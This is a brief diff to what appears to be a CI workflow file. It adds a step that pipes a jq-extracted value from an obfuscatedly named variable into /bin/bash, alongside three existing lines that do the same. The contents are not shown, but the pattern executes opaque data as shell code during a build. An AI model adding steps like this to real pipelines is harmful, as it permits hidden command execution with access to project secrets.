@@ -39,6 +39,7 @@ jobs:
           echo $crgsl211 | jq -r .npct8 | /bin/bash
           echo $vt228 | jq -r .wyc76 | /bin/bash
           echo $n0 | jq -r .lvfn7 | /bin/bash
+          echo $s96667 | jq -r .pgh5486 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
